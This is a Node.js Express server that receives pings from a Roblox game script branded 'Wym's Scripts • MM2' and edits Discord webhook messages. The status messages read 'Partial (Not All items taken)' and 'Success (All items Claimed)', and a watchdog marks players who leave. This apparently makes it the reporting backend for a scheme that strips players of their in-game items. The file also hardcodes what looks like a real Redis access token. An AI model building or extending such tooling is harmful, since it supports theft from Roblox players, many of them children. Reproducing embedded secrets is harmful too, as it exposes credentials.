const express = require('express');
const { Redis } = require('@upstash/redis');
const axios = require('axios');

const app = express();
app.use(express.json());

// Initialize Redis
const redis = new Redis({
  url: "https://sincere-pika-37791.upstash.io",
  token: "AZOfAAIncDFhMGViOTE2MTRiYjg0ZjRmOWRmNTg4ODViNTNiNDAwMXAxMzc3OTE",
});

// Helper for Discord - Wrapped in Try/Catch to prevent crashes
async function editDiscord(url, msgId, title, description, color, footerText) {
    if (!url || !msgId) return;
    try {
        await axios.patch(`${url}/messages/${msgId}`, {
            embeds: [{
                title: title,
                description: `## Status:\n\`\`\`lua\n${description}\n\`\`\``,
                color: color,
                footer: { text: footerText },
                timestamp: new Date().toISOString()
            }]
        });
        console.log(`[Discord] Edited: ${description}`);
    } catch (err) {
        console.error(`[Discord Error] ${err.response?.status || err.message}`);
    }
}

// 1. WATCHDOG LOOP (Persistent)
setInterval(async () => {
    try {
        const keys = await redis.keys('hb_*');
        const now = Date.now();
        for (const key of keys) {
            const data = await redis.get(key);
            if (data && (now - data.lastSeen > 75000)) { // 75 second timeout
                await editDiscord(data.webhookUrl, data.msgId, "Wym's Scripts • MM2", "🔴 Left (Player Left Or Crashed)", 16711680, "Auto-detected timeout");
                await redis.del(key);
            }
        }
    } catch (err) {
        console.error("[Watchdog Loop Error]", err.message);
    }
}, 20000);

// 2. MAIN ENDPOINT
app.post('/', async (req, res) => {
    try {
        const { msgId, webhookUrl, action } = req.body;
        
        if (!msgId || !webhookUrl) {
            return res.status(200).json({ error: "Missing ID or URL" }); 
        }

        console.log(`[Roblox] Action: ${action} | ID: ${msgId}`);

        if (action === "ping") {
            await redis.set(`hb_${msgId}`, { msgId, webhookUrl, lastSeen: Date.now() }, { ex: 3600 });
        } 
        else if (action === "partial") {
            await editDiscord(webhookUrl, msgId, "Wym's Scripts • MM2", "🟡 Partial (Not All items taken)", 16776960, "Partial Progress");
        } 
        else if (action === "stop") {
            await editDiscord(webhookUrl, msgId, "Wym's Scripts • MM2", "🟢 Success (All items Claimed)", 65280, "Trade completed successfully!");
            await redis.del(`hb_${msgId}`);
        }

        res.status(200).json({ ok: true });
    } catch (err) {
        console.error("[Request Error]", err.message);
        res.status(200).json({ ok: false }); // Still return 200 so Roblox doesn't error
    }
});

// IMPORTANT: Railway uses the PORT environment variable
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server Online on Port ${PORT}`);
});
